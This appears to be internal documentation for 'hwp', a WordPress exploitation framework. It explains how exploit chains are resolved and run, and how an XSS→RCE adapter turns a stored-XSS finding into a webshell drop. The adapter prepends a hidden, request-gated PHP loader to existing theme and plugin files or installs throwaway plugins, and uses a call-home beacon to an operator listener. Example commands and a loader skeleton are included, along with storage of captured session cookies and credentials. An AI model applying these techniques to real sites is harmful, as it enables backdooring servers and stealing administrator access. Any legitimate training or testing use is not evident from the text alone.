# Framework Internals

How the HWP framework resolves and executes exploit chains.

## Execution Flow

```
hwp (no args)  →  Interactive TUI
hwp -t ... --exploit ... --payload ...  →  CLI mode
```

CLI mode flow:

```
1. Parse args
2. Load exploit classes
3. Load payload class
4. run_chain()
   a. Load stored auth (session cookies, credentials)
   b. Separate AUTH exploits from chain exploits
   c. Run AUTH exploits first
   d. Check auth requirements
   e. Match payload to exploit (right-to-left capability match)
   f. Get instructions from payload
      ↳ XSS→RCE adapter (if active): convert each RCE instruction to XSS delivery JS
   g. Identify delivery exploit and transformers
   h. Execute: transformers → delivery → collect results
   i. Call payload.report(results)
   j. XSS→RCE adapter (if active): wait for beacon, emit XSS-specific status
```

## Chain Resolution

Given: `--exploit hwp-training/1.0.0-auth hwp-training/1.0.0-objinj hwp-training/1.0.0-pop-rce hwp-training/1.0.0-rce --payload webshell`

The framework:
1. Separates `hwp-training/1.0.0-auth` (capability=AUTH) → runs first
2. Remaining chain: `1.0.0-objinj`, `1.0.0-pop-rce`, `1.0.0-rce`
3. Matches payload `webshell` (methods=["RCE"]) to rightmost RCE exploit
4. Identifies delivery exploit (first with `delivers=None`)
5. Remaining exploits are transformers, processed right-to-left

## XSS→RCE Adapter

The XSS→RCE adapter is a framework-core transformer that lets an RCE payload be
delivered through a stored-XSS exploit. It is toggled by the operator
(`--xss-rce-adapter`), not written by module authors.

Communicating impact is the point: `alert(1)` proves XSS to a researcher but
means nothing to a webmaster. Code running on the server — a file written, a
command executed — is unambiguous. The adapter turns a stored-XSS finding into
demonstrated RCE.

### Chain shape

Resolved right-to-left, like any transformer:

```
payload(RCE) → [adapter, delivers="XSS"] → exploit(XSS, stored)
```

- The payload is **unchanged** and owns its PHP completely — filename, target
  path, file-writing logic. It does not know the adapter exists. To the adapter
  the instruction is just opaque PHP: it could be a webshell dropper or
  `echo "hi"`.
- The adapter prepends a server-side call-home block, then wraps the whole thing
  in admin-context JavaScript that delivers it to the server and triggers it. It
  never names anything for the payload and never rewrites the payload's PHP.
- The XSS exploit stores the JS and returns immediately.

### Enabling it

```bash
# Drop an RCE payload via a stored-XSS exploit
hwp -t http://target.com --exploit hwp-training/1.0.0-xss --payload webshell --xss-rce-adapter

# Add a beacon to confirm server-side execution (true RCE)
hwp -t ... --exploit hwp-training/1.0.0-xss --payload webshell --xss-rce-adapter --lhost 10.0.0.5 --lport 8888

# Stream the JS sink chain to the browser console for debugging
hwp -t ... --exploit ... --payload webshell --xss-rce-adapter --adapter-debug
```

The adapter only *activates* when it is enabled AND the matched exploit is an XSS
sink AND the payload produced an RCE instruction. Otherwise the run proceeds
normally.

### The loader

What the adapter delivers is one PHP block, dormant unless requested with
`?hwp-beacon=1`:

```php
<?php if (isset($_REQUEST['hwp-beacon'])) {
    <call-home machinery>
    ob_start();
    <PAYLOAD PHP, verbatim>
    <emit JSON to browser + POST it to the listener>
    die();
} ?>
<original file content>          // edit sinks only
```

The gate means the block does nothing on a normal request, so when an edit sink
prepends it to an existing file, that file keeps its behaviour. The block goes
**first** (and `die()`s inside the gate) for two reasons: the original file might
`die()` early (e.g. `defined('ABSPATH')||die;`), which would stop the loader from
running if appended below; and the original's normal output would otherwise
pollute the clean JSON beacon response.

The payload's own `echo` is captured (`ob_start`/`ob_get_clean`) and returned in
the JSON `output` field. A `register_shutdown_function` guard ensures this still
reports even if the payload calls `die()`/`exit()` or fatals.

### Sinks

At browser-fire time the JS tries sinks in reliability order, each gated on the
admin's capability and **verified reachable** before being treated as success:

| Sink | Mechanism |
|------|-----------|
| plugin-upload | install a throwaway `.zip` plugin carrying the loader |
| theme-upload  | install a throwaway `.zip` theme carrying the loader |
| media-upload  | upload the loader `.php` to `wp-content/uploads/` (needs `unfiltered_upload`) |
| theme-editor  | **prepend** the loader atop an existing theme file |
| plugin-editor | **prepend** the loader atop an existing plugin file |

A write that lands is not success on its own — some files can't be reached
afterwards (e.g. `wp-content/plugins/akismet/.htaccess` denies direct access to
its `.php`). Each sink verifies the written file responds to `?hwp-beacon=1` and
only stops on a file that both writes AND fires; otherwise it falls through to
the next file / next sink. Editor sinks fetch the file's current content and
write `loader + original` (append), never replacing it.

### Beacon

The call-home is **PHP, not JavaScript**, on purpose: a server-side request has
no CORS/same-origin restriction reaching the operator's listener.

```
--lhost set    → the loader's PHP posts back when it EXECUTES on the server.
                 The framework starts a listener, waits, and reports the hit
                 (loader location, payload output, whoami). This proves RCE.
no --lhost     → no call-home. The JS still delivers + triggers the loader, and
                 the browser still receives the JSON outcome (visible with
                 --adapter-debug), confirming execution.
```

The framework (`chain.py`) owns the listener lifecycle and all XSS-specific
operator messaging, so the unchanged payload's `report()` never has to know this
happened. See `lib/adapter.py` and `lib/beacon_server.py`.

## AUTH Flow

AUTH exploits run before everything else. They produce session cookies
and/or credentials which are stored and passed to subsequent exploits.

```
AUTH exploit runs → result.session → stored in ~/.hackwp/sessions/
                  → result.credentials → stored in ~/.hackwp/sessions/
                  → session cookies passed to HTTP instances
```

If an exploit has `auth_required = True` but no session exists,
the framework exits with a clear error before anything runs.

Exploits request auth on individual HTTP calls with `auth=True`:
```python
resp = self.http.get(url, auth=True)   # sends session cookies
resp = self.http.get(url)              # no cookies sent
```

## Verbose Levels

| Level | Flag | What shows |
|-------|------|------------|
| 0 | (none) | Payload output, exploit errors, framework errors |
| 1 | `-v` | + Exploit info/success messages |
| 2 | `-vv` | + Raw Result field dumps (debugging) |

### Output rules by component:

**Exploits:**
- `self.info()` → verbose only (`-v`)
- `self.success()` → verbose only (`-v`)
- `self.error()` → always
- `self.warn()` → always

**Payloads:**
- `self.info()` → always
- `self.success()` → always
- `self.error()` → always
- `self.warn()` → always

**Framework:**
- Session/credential storage → silent always
- Result field dump → very verbose only (`-vv`)
- XSS→RCE adapter / beacon status → emitted by the framework, not the payload
- Error conditions → always

## Error Handling

The framework wraps all exploit and payload execution in try/except.

| Condition | Behavior |
|-----------|----------|
| Exploit returns `None` | Exit: "Exploit(slug) did not return a result. Exploits need to return through self.result()" |
| Exploit returns non-Result | Exit: "Exploit(slug) returned X instead of Result" |
| Exploit raises exception | Exit: "Exploit(slug) failed with the following error" + traceback |
| Payload raises exception | Exit: "Payload(name) failed with the following error" + traceback |
| Unknown Result field | Exit: "Result received unknown field(s): X. Valid fields: ..." |

## Result Class

Strict field set. Unknown fields raise `ValueError`.

| Field | Type | Description |
|-------|------|-------------|
| `success` | bool | Required |
| `output` | str | Raw response / command output |
| `rows_affected` | int | SQL rows affected |
| `insert_id` | int | SQL insert ID |
| `url` | str | Remote URL |
| `path` | str | Filesystem path on target |
| `session` | dict | Session cookies (framework stores silently) |
| `credentials` | dict | `{"username", "password", "role"}` (framework stores silently) |
| `message` | str | Human-readable status |

## HTTP Client

The `self.http` object on exploits handles auth-gated cookie injection.

| Call | Cookies sent |
|------|-------------|
| `self.http.get(url)` | None |
| `self.http.get(url, auth=True)` | Session cookies |
| `self.http.post(url, auth=True, cookies={"x": "y"})` | Session + explicit (merged) |
| `self.http.get(url, auth=True)` without session | Raises `AuthRequired` error |

Session cookies are never sent unless `auth=True` is explicitly passed.

## Session Storage

Sessions and credentials persist in `~/.hackwp/sessions/{domain}/`:

```
~/.hackwp/sessions/
  target.com/
    session.json      # cookie dict
    credentials.json  # {"username": ..., "password": ..., "role": ...}
```

The framework loads stored auth at the start of every chain execution.
CLI `--cookie` and `--user`/`--pass` override stored values.
`--clear-session` wipes stored data for a target.

## Scanner

The scanner runs as `hwp -t <target> --scan` and enumerates core, themes, plugins, users, and security misconfigurations.

### Aggressiveness Levels

| Flag | Level | What it does |
|------|-------|-------------|
| (none) | 0 | Passive — crawl site HTML + REST API namespaces for plugins |
| `-a` | 1 | + Probe 1,500 popular plugin slugs (HEAD then GET readme) |
| `-aa` | 2 | + Probe all plugin slugs from the vulnerability database |

Each level includes everything from the previous levels. HEAD requests are used first to find candidates, then GET requests verify and extract versions.

### Storage

All scanner data is stored under `~/.hackwp/`:

```
~/.hackwp/
├── sessions/           # Per-domain session cookies and credentials
├── scans/              # Scan results per hostname (JSON)
└── vulndb/             # Downloaded vulnerability databases
    ├── vulnerabilities.json
    └── wp_versions.json
```

### Scan Intel

Scan results are automatically loaded by the TUI when the target hostname matches a cached scan. The TUI cross-references exploits against scan data to show `confirmed` or `possible` markers on matching exploits. Press **F2** to filter the exploit list to only show matches.

## Project Structure

```
hwp/
├── hwp.py                  # CLI entry point
├── hwp/                    # Public package (from hwp import Exploit, Payload)
│   └── __init__.py
├── lib/                    # Framework internals
│   ├── adapter.py          # XSS→RCE adapter (core transformer)
│   ├── beacon_server.py    # Beacon listener for server-side RCE confirmation
│   ├── chain.py            # Chain resolver & executor
│   ├── exploit.py          # Exploit base class
│   ├── http.py             # HTTP wrapper with auth gating
│   ├── interactive.py      # Textual TUI
│   ├── loader.py           # Module discovery
│   ├── output.py           # Colored terminal output
│   ├── payload.py          # Payload base class
│   ├── result.py           # Result class with field validation
│   ├── rfi_server.py       # Temporary HTTP server for RFI fallback
│   ├── store.py            # Session/credential persistence
│   └── version.py          # Version range parsing
├── exploits/               # Exploit modules
├── payloads/               # Payload modules
├── scanner/                # Integrated scanner
├── data/                   # Wordlists for scanner
└── docs/                   # Documentation
    ├── creating-exploits.md
    ├── creating-payloads.md
    └── framework.md
```
